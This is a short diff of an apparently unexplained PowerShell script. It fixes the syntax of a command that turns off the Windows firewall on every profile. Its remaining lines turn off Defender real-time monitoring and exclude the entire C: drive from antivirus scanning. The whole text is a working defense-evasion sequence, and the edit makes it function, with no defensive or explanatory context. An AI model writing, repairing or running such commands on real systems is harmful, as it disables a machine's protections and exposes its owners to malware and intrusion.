@@ -1,4 +1,4 @@
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath C:\
 
